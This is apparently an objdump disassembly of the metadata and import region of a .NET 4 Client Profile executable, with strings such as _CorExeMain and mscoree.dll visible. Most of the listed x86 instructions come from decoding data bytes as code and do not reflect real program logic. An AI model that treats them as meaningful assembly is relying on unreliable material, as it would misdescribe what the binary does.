  40a175:	00 04 00             	add    %al,(%eax,%eax,1)
  40a178:	00 00                	add    %al,(%eax)
  40a17a:	80 02 06             	addb   $0x6,(%edx)
  40a17d:	0e                   	push   %cs
  40a17e:	03 06                	add    (%esi),%eax
  40a180:	12 41 03             	adc    0x3(%ecx),%al
  40a183:	06                   	push   %es
  40a184:	12 58 03             	adc    0x3(%eax),%bl
  40a187:	06                   	push   %es
  40a188:	12 4d 03             	adc    0x3(%ebp),%cl
  40a18b:	06                   	push   %es
  40a18c:	12 51 03             	adc    0x3(%ecx),%dl
  40a18f:	06                   	push   %es
  40a190:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40a195:	03 06                	add    (%esi),%eax
  40a197:	12 55 02             	adc    0x2(%ebp),%dl
  40a19a:	06                   	push   %es
  40a19b:	02 02                	add    (%edx),%al
  40a19d:	06                   	push   %es
  40a19e:	1c 02                	sbb    $0x2,%al
  40a1a0:	06                   	push   %es
  40a1a1:	08 03                	or     %al,(%ebx)
  40a1a3:	06                   	push   %es
  40a1a4:	12 79 08             	adc    0x8(%ecx),%bh
  40a1a7:	06                   	push   %es
  40a1a8:	15 12 80 85 01       	adc    $0x1858012,%eax
  40a1ad:	12 20                	adc    (%eax),%ah
  40a1af:	03 06                	add    (%esi),%eax
  40a1b1:	12 20                	adc    (%eax),%ah
  40a1b3:	03 06                	add    (%esi),%eax
  40a1b5:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40a1b8:	06                   	push   %es
  40a1b9:	12 1c 04             	adc    (%esp,%eax,1),%bl
  40a1bc:	06                   	push   %es
  40a1bd:	12 80 d1 03 06 11    	adc    0x110603d1(%eax),%al
  40a1c3:	74 03                	je     0x40a1c8
  40a1c5:	06                   	push   %es
  40a1c6:	11 70 02             	adc    %esi,0x2(%eax)
  40a1c9:	06                   	push   %es
  40a1ca:	09 03                	or     %eax,(%ebx)
  40a1cc:	06                   	push   %es
  40a1cd:	11 68 1c             	adc    %ebp,0x1c(%eax)
  40a1d0:	06                   	push   %es
  40a1d1:	15 12 80 d9 01       	adc    $0x1d98012,%eax
  40a1d6:	15 12 80 dd 0a       	adc    $0xadd8012,%eax
  40a1db:	12 80 e1 1c 12 4d    	adc    0x4d121ce1(%eax),%al
  40a1e1:	12 41 0e             	adc    0xe(%ecx),%al
  40a1e4:	1d 05 12 80 d1       	sbb    $0xd1801205,%eax
  40a1e9:	0e                   	push   %cs
  40a1ea:	0e                   	push   %cs
  40a1eb:	0e                   	push   %cs
  40a1ec:	04 00                	add    $0x0,%al
  40a1ee:	00 12                	add    %dl,(%edx)
  40a1f0:	4d                   	dec    %ebp
  40a1f1:	05 00 01 01 12       	add    $0x12010100,%eax
  40a1f6:	4d                   	dec    %ebp
  40a1f7:	04 00                	add    $0x0,%al
  40a1f9:	00 12                	add    %dl,(%edx)
  40a1fb:	51                   	push   %ecx
  40a1fc:	05 00 01 01 12       	add    $0x12010100,%eax
  40a201:	51                   	push   %ecx
  40a202:	04 00                	add    $0x0,%al
  40a204:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40a20a:	01 1d 05 03 00 00    	add    %ebx,0x305
  40a210:	0a 04 00             	or     (%eax,%eax,1),%al
  40a213:	01 01                	add    %eax,(%ecx)
  40a215:	0a 04 00             	or     (%eax,%eax,1),%al
  40a218:	00 12                	add    %dl,(%edx)
  40a21a:	55                   	push   %ebp
  40a21b:	05 00 01 01 12       	add    $0x12010100,%eax
  40a220:	55                   	push   %ebp
  40a221:	04 00                	add    $0x0,%al
  40a223:	01 01                	add    %eax,(%ecx)
  40a225:	02 03                	add    (%ebx),%al
  40a227:	00 00                	add    %al,(%eax)
  40a229:	1c 0a                	sbb    $0xa,%al
  40a22b:	00 04 02             	add    %al,(%edx,%eax,1)
  40a22e:	1c 12                	sbb    $0x12,%al
  40a230:	65 12 69 11          	adc    %gs:0x11(%ecx),%ch
  40a234:	6d                   	insl   (%dx),%es:(%edi)
  40a235:	05 00 01 01 12       	add    $0x12010100,%eax
  40a23a:	71 06                	jno    0x40a242
  40a23c:	00 01                	add    %al,(%ecx)
  40a23e:	1d 05 1d 05 0a       	sbb    $0xa051d05,%eax
  40a243:	20 01                	and    %al,(%ecx)
  40a245:	01 15 12 80 85 01    	add    %edx,0x1858012
  40a24b:	12 20                	adc    (%eax),%ah
  40a24d:	0c 20                	or     $0x20,%al
  40a24f:	02 01                	add    (%ecx),%al
  40a251:	12 20                	adc    (%eax),%ah
  40a253:	15 12 80 85 01       	adc    $0x1858012,%eax
  40a258:	12 20                	adc    (%eax),%ah
  40a25a:	04 20                	add    $0x20,%al
  40a25c:	00 12                	add    %dl,(%edx)
  40a25e:	20 05 20 01 12 20    	and    %al,0x20120120
  40a264:	0e                   	push   %cs
  40a265:	05 20 01 12 20       	add    $0x20120120,%eax
  40a26a:	0a 05 20 01 12 20    	or     0x20120120,%al
  40a270:	0d 05 20 01 12       	or     $0x12012005,%eax
  40a275:	20 08                	and    %cl,(%eax)
  40a277:	04 20                	add    $0x20,%al
  40a279:	01 08                	add    %ecx,(%eax)
  40a27b:	0e                   	push   %cs
  40a27c:	06                   	push   %es
  40a27d:	20 01                	and    %al,(%ecx)
  40a27f:	01 12                	add    %edx,(%edx)
  40a281:	80 95 04 20 01 01 0b 	adcb   $0xb,0x1012004(%ebp)
  40a288:	03 20                	add    (%eax),%esp
  40a28a:	00 0b                	add    %cl,(%ebx)
  40a28c:	03 20                	add    (%eax),%esp
  40a28e:	00 0d 04 20 01 01    	add    %cl,0x1012004
  40a294:	0c 04                	or     $0x4,%al
  40a296:	20 01                	and    %al,(%ecx)
  40a298:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40a29e:	1c 04                	sbb    $0x4,%al
  40a2a0:	20 00                	and    %al,(%eax)
  40a2a2:	11 24 07             	adc    %esp,(%edi,%eax,1)
  40a2a5:	00 02                	add    %al,(%edx)
  40a2a7:	0e                   	push   %cs
  40a2a8:	12 80 95 08 06 00    	adc    0x60895(%eax),%al
  40a2ae:	01 0e                	add    %ecx,(%esi)
  40a2b0:	12 80 95 07 00 02    	adc    0x2000795(%eax),%al
  40a2b6:	0e                   	push   %cs
  40a2b7:	05 12 80 95 06       	add    $0x6958012,%eax
  40a2bc:	00 01                	add    %al,(%ecx)
  40a2be:	01 12                	add    %edx,(%edx)
  40a2c0:	80 95 07 00 02 01 12 	adcb   $0x12,0x1020007(%ebp)
  40a2c7:	80 95 0e 08 00 02 01 	adcb   $0x1,0x200080e(%ebp)
  40a2ce:	12 80 95 1d 05 07    	adc    0x7051d95(%eax),%al
  40a2d4:	00 02                	add    %al,(%edx)
  40a2d6:	01 12                	add    %edx,(%edx)
  40a2d8:	80 95 0d 07 00 02 01 	adcb   $0x1,0x200070d(%ebp)
  40a2df:	12 80 95 0c 07 00    	adc    0x70c95(%eax),%al
  40a2e5:	02 01                	add    (%ecx),%al
  40a2e7:	12 80 95 02 07 00    	adc    0x70295(%eax),%al
  40a2ed:	02 01                	add    (%ecx),%al
  40a2ef:	12 80 95 0b 07 00    	adc    0x70b95(%eax),%al
  40a2f5:	02 01                	add    (%ecx),%al
  40a2f7:	12 80 95 0a 04 00    	adc    0x40a95(%eax),%al
  40a2fd:	01 18                	add    %ebx,(%eax)
  40a2ff:	0e                   	push   %cs
  40a300:	06                   	push   %es
  40a301:	00 02                	add    %al,(%edx)
  40a303:	02 18                	add    (%eax),%bl
  40a305:	10 02                	adc    %al,(%edx)
  40a307:	06                   	push   %es
  40a308:	20 01                	and    %al,(%ecx)
  40a30a:	0e                   	push   %cs
  40a30b:	12 80 a9 08 00 01    	adc    0x10008a9(%eax),%al
  40a311:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40a317:	06                   	push   %es
  40a318:	00 01                	add    %al,(%ecx)
  40a31a:	11 68 11             	adc    %ebp,0x11(%eax)
  40a31d:	68 07 00 02 01       	push   $0x1020007
  40a322:	1c 12                	sbb    $0x12,%al
  40a324:	80 d5 06             	adc    $0x6,%ch
  40a327:	00 03                	add    %al,(%ebx)
  40a329:	01 09                	add    %ecx,(%ecx)
  40a32b:	09 09                	or     %ecx,(%ecx)
  40a32d:	05 00 01 01 12       	add    $0x12010100,%eax
  40a332:	20 07                	and    %al,(%edi)
  40a334:	20 02                	and    %al,(%edx)
  40a336:	02 1d 05 1d 05 04    	add    0x4051d05,%bl
  40a33c:	08 00                	or     %al,(%eax)
  40a33e:	12 4d 04             	adc    0x4(%ebp),%cl
  40a341:	08 00                	or     %al,(%eax)
  40a343:	12 51 04             	adc    0x4(%ecx),%dl
  40a346:	08 00                	or     %al,(%eax)
  40a348:	1d 05 03 08 00       	sbb    $0x80305,%eax
  40a34d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40a350:	00 12                	add    %dl,(%edx)
  40a352:	55                   	push   %ebp
  40a353:	03 08                	add    (%eax),%ecx
  40a355:	00 02                	add    %al,(%edx)
  40a357:	03 08                	add    (%eax),%ecx
  40a359:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40a35c:	08 00                	or     %al,(%eax)
  40a35e:	08 03                	or     %al,(%ebx)
  40a360:	28 00                	sub    %al,(%eax)
  40a362:	1c 05                	sbb    $0x5,%al
  40a364:	28 01                	sub    %al,(%ecx)
  40a366:	12 20                	adc    (%eax),%ah
  40a368:	08 03                	or     %al,(%ebx)
  40a36a:	28 00                	sub    %al,(%eax)
  40a36c:	08 03                	or     %al,(%ebx)
  40a36e:	28 00                	sub    %al,(%eax)
  40a370:	0e                   	push   %cs
  40a371:	03 28                	add    (%eax),%ebp
  40a373:	00 0a                	add    %cl,(%edx)
  40a375:	03 28                	add    (%eax),%ebp
  40a377:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40a37d:	1c 04                	sbb    $0x4,%al
  40a37f:	28 00                	sub    %al,(%eax)
  40a381:	11 24 08             	adc    %esp,(%eax,%ecx,1)
  40a384:	01 00                	add    %eax,(%eax)
  40a386:	08 00                	or     %al,(%eax)
  40a388:	00 00                	add    %al,(%eax)
  40a38a:	00 00                	add    %al,(%eax)
  40a38c:	1e                   	push   %ds
  40a38d:	01 00                	add    %eax,(%eax)
  40a38f:	01 00                	add    %eax,(%eax)
  40a391:	54                   	push   %esp
  40a392:	02 16                	add    (%esi),%dl
  40a394:	57                   	push   %edi
  40a395:	72 61                	jb     0x40a3f8
  40a397:	70 4e                	jo     0x40a3e7
  40a399:	6f                   	outsl  %ds:(%esi),(%dx)
  40a39a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a39b:	45                   	inc    %ebp
  40a39c:	78 63                	js     0x40a401
  40a39e:	65 70 74             	gs jo  0x40a415
  40a3a1:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40a3a8:	77 73                	ja     0x40a41d
  40a3aa:	01 08                	add    %ecx,(%eax)
  40a3ac:	01 00                	add    %eax,(%eax)
  40a3ae:	02 00                	add    (%eax),%al
  40a3b0:	00 00                	add    %al,(%eax)
  40a3b2:	00 00                	add    %al,(%eax)
  40a3b4:	05 01 00 00 00       	add    $0x1,%eax
  40a3b9:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40a3bc:	00 07                	add    %al,(%edi)
  40a3be:	31 2e                	xor    %ebp,(%esi)
  40a3c0:	30 2e                	xor    %ch,(%esi)
  40a3c2:	30 2e                	xor    %ch,(%esi)
  40a3c4:	30 00                	xor    %al,(%eax)
  40a3c6:	00 65 01             	add    %ah,0x1(%ebp)
  40a3c9:	00 29                	add    %ch,(%ecx)
  40a3cb:	2e 4e                	cs dec %esi
  40a3cd:	45                   	inc    %ebp
  40a3ce:	54                   	push   %esp
  40a3cf:	46                   	inc    %esi
  40a3d0:	72 61                	jb     0x40a433
  40a3d2:	6d                   	insl   (%dx),%es:(%edi)
  40a3d3:	65 77 6f             	gs ja  0x40a445
  40a3d6:	72 6b                	jb     0x40a443
  40a3d8:	2c 56                	sub    $0x56,%al
  40a3da:	65 72 73             	gs jb  0x40a450
  40a3dd:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40a3e4:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40a3e7:	72 6f                	jb     0x40a458
  40a3e9:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40a3f0:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40a3f7:	0e                   	push   %cs
  40a3f8:	14 46                	adc    $0x46,%al
  40a3fa:	72 61                	jb     0x40a45d
  40a3fc:	6d                   	insl   (%dx),%es:(%edi)
  40a3fd:	65 77 6f             	gs ja  0x40a46f
  40a400:	72 6b                	jb     0x40a46d
  40a402:	44                   	inc    %esp
  40a403:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40a40a:	61                   	popa
  40a40b:	6d                   	insl   (%dx),%es:(%edi)
  40a40c:	65 1f                	gs pop %ds
  40a40e:	2e 4e                	cs dec %esi
  40a410:	45                   	inc    %ebp
  40a411:	54                   	push   %esp
  40a412:	20 46 72             	and    %al,0x72(%esi)
  40a415:	61                   	popa
  40a416:	6d                   	insl   (%dx),%es:(%edi)
  40a417:	65 77 6f             	gs ja  0x40a489
  40a41a:	72 6b                	jb     0x40a487
  40a41c:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40a41f:	43                   	inc    %ebx
  40a420:	6c                   	insb   (%dx),%es:(%edi)
  40a421:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40a428:	6f                   	outsl  %ds:(%esi),(%dx)
  40a429:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40a430:	04 49                	add    $0x49,%al
  40a432:	74 65                	je     0x40a499
  40a434:	6d                   	insl   (%dx),%es:(%edi)
	...
  40a441:	00 00                	add    %al,(%eax)
  40a443:	00 10                	add    %dl,(%eax)
	...
  40a451:	00 00                	add    %al,(%eax)
  40a453:	00 7c a4 00          	add    %bh,0x0(%esp,%eiz,4)
	...
  40a45f:	00 96 a4 00 00 00    	add    %dl,0xa4(%esi)
  40a465:	20 00                	and    %al,(%eax)
	...
  40a47b:	00 88 a4 00 00 00    	add    %cl,0xa4(%eax)
	...
  40a489:	00 5f 43             	add    %bl,0x43(%edi)
  40a48c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a48d:	72 45                	jb     0x40a4d4
  40a48f:	78 65                	js     0x40a4f6
  40a491:	4d                   	dec    %ebp
  40a492:	61                   	popa
  40a493:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40a49a:	72 65                	jb     0x40a501
  40a49c:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40a4a0:	6c                   	insb   (%dx),%es:(%edi)
  40a4a1:	00 00                	add    %al,(%eax)
  40a4a3:	00 00                	add    %al,(%eax)
  40a4a5:	00 ff                	add    %bh,%bh
  40a4a7:	25 00 20 40 00       	and    $0x402000,%eax
  40a4ac:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  40a4b1:	cd 97                	int    $0x97
  40a4b3:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40a4b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a4ba:	78 43                	js     0x40a4ff
  40a4bc:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  40a4c2:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40a4c8:	e6 c3                	out    %al,$0xc3
  40a4ca:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  40a4cd:	00 2f                	add    %ch,(%edi)
  40a4cf:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
	...
